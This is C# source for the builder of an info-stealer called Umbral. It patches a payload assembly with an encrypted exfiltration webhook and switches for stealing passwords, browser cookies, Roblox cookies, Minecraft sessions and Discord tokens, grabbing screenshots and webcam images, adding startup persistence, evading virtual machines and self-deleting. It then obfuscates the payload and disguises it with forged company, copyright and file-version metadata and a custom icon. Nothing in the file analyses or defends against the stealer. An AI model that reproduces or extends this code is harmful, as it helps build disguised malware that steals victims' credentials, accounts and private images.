using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Jose;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Mono.Cecil.Rocks;
using Vestris.ResourceLib;

namespace Umbral.builder.Build
{

    public struct AssemblyInfo
    {
        public string CompanyName;
        public string FileDescription;
        public string ProductName;
        public string LegalCopyright;
        public string LegalTrademarks;
        public string InternalName;
        public string OriginalFilename;
        public int[] FileVersion;
        public int[] ProductVersion;
        public int[] AssemblyVersion;
    }

    public class Builder
    {
        private const string Version = "v1.2";
        private const string PayloadFile = "Umbral.payload";
        public bool AntiVm;

        public AssemblyInfo AssemblyInformation;
        public bool CaptureScreenshot;
        public bool CaptureWebcam;
        public string IconPath;

        public string Output;

        public bool Ping;
        public bool SelfDestruct;
        public bool Startup;
        public bool StealCookies;
        public bool StealMinecraftSession;
        public bool StealPasswords;
        public bool StealRobloxCookies;
        public bool StealTokens;
        public string Webhook;

        public bool Build(TextBox textBox)
        {
            if (!File.Exists(PayloadFile))
            {
                textBox.AppendText($"File not found: {PayloadFile} file not found.");
                return false;
            }

            textBox.Clear();

            byte[] iv = Encoding.UTF8.GetBytes(GenerateRandomString(12));
            byte[] key = Encoding.UTF8.GetBytes(GenerateRandomString(32));

            try
            {

                #region ModifyInstructions

                string tempFile = GenerateRandomString(10) + ".tmp";
                textBox.AppendText("Reading payload file...");
                AssemblyDefinition assembly = AssemblyDefinition.ReadAssembly(PayloadFile);
                TypeDefinition settings =
                    assembly.MainModule.Types.Single(x => x.FullName == "Umbral.payload.Config.Settings");
                MethodDefinition constructor = settings.GetStaticConstructor();


                int strings = 0, bools = 0;

                textBox.AppendText("\r\nApplying settings...");

                foreach (Instruction instruction in constructor.Body.Instructions)
                {
                    if (instruction.OpCode == OpCodes.Ldstr) // String
                    {
                        switch (++strings)
                        {
                            case 1: // webhookUrl 
                                instruction.Operand = Encrypt(Webhook, key, iv);
                                break;
                            case 2: // version 
                                instruction.Operand = Encrypt(Version, key, iv);
                                break;
                            case 3: // mutex 
                                instruction.Operand = GenerateRandomString(20);
                                break;
                            case 4: // key 
                                instruction.Operand = Convert.ToBase64String(key);
                                break;
                            case 5: // iv
                                instruction.Operand = Convert.ToBase64String(iv);
                                break;
                        }

                    }
                    else if (instruction.OpCode == OpCodes.Ldc_I4_0 || instruction.OpCode == OpCodes.Ldc_I4_1) // Boolean
                    {
                        switch (++bools)
                        {
                            case 1: // ping 
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Ping ? 1 : 0;
                                break;
                            case 2: // antiVm 
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = AntiVm ? 1 : 0;
                                break;
                            case 3: // startup  
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Startup ? 1 : 0;
                                break;
                            case 4: // stealPasswords 
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = StealPasswords ? 1 : 0;
                                break;
                            case 5: // stealCookies 
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = StealCookies ? 1 : 0;
                                break;
                            case 6: // stealRobloxCookies 
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = StealRobloxCookies ? 1 : 0;
                                break;
                            case 7: // stealMinecraftFiles  
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = StealMinecraftSession ? 1 : 0;
                                break;
                            case 8: // stealDiscordTokens  
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = StealTokens ? 1 : 0;
                                break;
                            case 9: // takeScreenshot  
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = CaptureScreenshot ? 1 : 0;
                                break;
                            case 10: // deleteSelf
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = SelfDestruct ? 1 : 0;
                                break;
                            case 11: // captureWebcam
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = CaptureWebcam ? 1 : 0;
                                break;
                        }
                    }
                }

                Renamer renamer = new Renamer(assembly);
                if (!renamer.Perform())
                    textBox.AppendText("\r\nObfuscation Failed!");
                assembly.Write(tempFile);

                #endregion

                textBox.AppendText("\r\nModifying assembly information...");

                #region ModifyAssemblyInfo

                VersionResource resource = new VersionResource();
                resource.LoadFrom(tempFile);

                resource.FileVersion = string.Join(".", AssemblyInformation.FileVersion);
                resource.ProductVersion = string.Join(".", AssemblyInformation.AssemblyVersion);
                resource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)resource["StringFileInfo"];
                stringFileInfo["CompanyName"] = AssemblyInformation.CompanyName;
                stringFileInfo["FileDescription"] = AssemblyInformation.FileDescription;
                stringFileInfo["ProductName"] = AssemblyInformation.ProductName;
                stringFileInfo["LegalCopyright"] = AssemblyInformation.LegalCopyright;
                stringFileInfo["LegalTrademarks"] = AssemblyInformation.LegalTrademarks;
                stringFileInfo["ProductVersion"] = string.Join(".", AssemblyInformation.ProductVersion);
                stringFileInfo["FileVersion"] = string.Join(".", AssemblyInformation.FileVersion);
                stringFileInfo["AssemblyVersion"] = string.Join(".", AssemblyInformation.AssemblyVersion);
                stringFileInfo["InternalName"] = AssemblyInformation.InternalName;
                stringFileInfo["OriginalFilename"] = AssemblyInformation.OriginalFilename;

                StringTableEntry.ConsiderPaddingForLength = true;
                resource.SaveTo(tempFile);

                #endregion

                if (File.Exists(IconPath) && IconPath.ToLower().EndsWith(".ico") && File.Exists(tempFile))
                {

                    #region ModifyIcon

                    textBox.AppendText("\r\nApplying icon...");
                    IconFile iconFile = new IconFile(IconPath);
                    IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
                    iconDirectoryResource.SaveTo(tempFile);

                    #endregion

                }

                if (File.Exists(Output))
                    File.Delete(Output);


                File.Move(tempFile, Output);

                if (File.Exists(tempFile))
                    File.Delete(tempFile);

                textBox.AppendText($"\r\nSuccessfully saved as \"{Path.GetFileName(Output)}\"");

                textBox.AppendText("\r\n----------------------------------------------");

                return true;
            }
            catch (Exception ex)
            {
                textBox.AppendText($"\r\nError: {ex.Message}:{ex.StackTrace}");
            }

            return false;
        }

        static private string GenerateRandomString(int length)
        {
            Random random = new Random();
            string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            StringBuilder result = new StringBuilder();

            for (int i = 0; i < length; i++)
                result.Append(chars[random.Next(0, chars.Length)]);

            return result.ToString();
        }

        static private string Encrypt(string value, byte[] key, byte[] iv)
        {
            byte[][] structure = AesGcm.Encrypt(key, iv, null, Encoding.UTF8.GetBytes(value));

            return Convert.ToBase64String(structure[0].Concat(structure[1]).ToArray());
        }
    }
}